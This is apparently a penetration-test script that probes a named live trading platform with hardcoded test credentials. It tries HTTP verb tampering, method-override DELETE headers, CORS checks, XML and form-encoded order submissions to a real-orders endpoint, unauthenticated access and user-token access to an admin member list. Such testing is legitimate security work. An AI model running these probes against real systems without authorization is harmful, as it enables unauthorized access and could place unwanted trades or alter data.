"""
BUG-30: HTTP Method Tampering / Verb Override on Protected Endpoints
Attack: Try non-standard HTTP verbs (HEAD, PATCH, OPTIONS, TRACE) on sensitive endpoints.
        Some frameworks improperly route verbs, leading to auth bypass or data exposure.

Also tests:
BUG-30b: Missing CORS restriction — can cross-origin JS read trading data?
BUG-30c: Content-type confusion — send XML/text to JSON endpoints
"""
import requests, json

BASE_URL = "https://lpadmin.blackfx.com"

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_m, h_m = make_session("mamm@mailinator.com", "12345678")

print("=== BUG-30: HTTP Method Tampering & Content-Type Confusion ===\n")
bugs = []

# Test 1: Sensitive endpoint with HEAD (should not leak data, often does)
sensitive_endpoints = [
    f"{BASE_URL}/v1/oms/real/positions",
    f"{BASE_URL}/v1/oms/real/orders",
    f"{BASE_URL}/admin/api/members",
]

print("--- HTTP Verb Tests ---")
for ep in sensitive_endpoints:
    for method in ["HEAD", "OPTIONS", "PATCH"]:
        r = requests.request(method, ep, headers=h_m)
        print(f"{method} {ep.split('/')[-1]}: {r.status_code} | headers: {dict(list(r.headers.items())[:5])}")
        if method == "OPTIONS" and "Access-Control-Allow-Origin" in r.headers:
            origin = r.headers["Access-Control-Allow-Origin"]
            print(f"  CORS Origin: {origin}")
            if origin == "*":
                bugs.append(f"BUG-30b: CORS wildcard on {ep} — any origin can read trading data!")
                print(f"  🚨 CORS wildcard on sensitive trading endpoint!")

# Test 2: Content-Type confusion
print("\n--- Content-Type Confusion Tests ---")
# Send XML to JSON endpoint
xml_payload = "<order><symbol>EURUSD</symbol><side>BUY</side><quantity>1.0</quantity><type>MARKET</type></order>"
r_xml = s_m.post(f"{BASE_URL}/v1/oms/real/orders",
    headers={**h_m, "Content-Type": "application/xml"},
    data=xml_payload)
print(f"XML payload to orders endpoint: {r_xml.status_code} {r_xml.text[:200]}")

# Send form-encoded
r_form = s_m.post(f"{BASE_URL}/v1/oms/real/orders",
    headers={**h_m, "Content-Type": "application/x-www-form-urlencoded"},
    data={"symbol": "EURUSD", "side": "BUY", "quantity": "0.01", "type": "MARKET"})
print(f"Form-encoded to orders endpoint: {r_form.status_code} {r_form.text[:200]}")
if r_form.status_code == 200:
    bugs.append("BUG-30c: Form-encoded order accepted — CSRF possible without CORS protection!")
    print("🚨 Form-encoded order accepted!")

# Test 3: HTTP Method Override headers (X-HTTP-Method-Override)
r_override = requests.get(
    f"{BASE_URL}/v1/oms/real/orders",
    headers={**h_m, "X-HTTP-Method-Override": "DELETE", "X-Method-Override": "DELETE"}
)
print(f"GET with X-HTTP-Method-Override: DELETE: {r_override.status_code} {r_override.text[:200]}")

# Test 4: Unauthenticated access (no token)
r_noauth = requests.get(f"{BASE_URL}/v1/oms/real/positions")
print(f"No-auth positions: {r_noauth.status_code} {r_noauth.text[:200]}")
if r_noauth.status_code == 200:
    bugs.append("BUG-30d: Positions endpoint accessible without authentication!")

# Test 5: Try admin endpoints without admin token (using user token)
r_user_admin = requests.get(f"{BASE_URL}/admin/api/members", headers=h_m)
print(f"User token on admin endpoint: {r_user_admin.status_code} {r_user_admin.text[:200]}")
if r_user_admin.status_code == 200:
    bugs.append("BUG-30e: Admin member list accessible with user JWT!")

print("\n=== FINDINGS ===")
if bugs:
    for b in bugs:
        print(f"🚨 {b}")
else:
    print("No HTTP method tampering bugs found.")

print("\nBUG-30 test complete.")
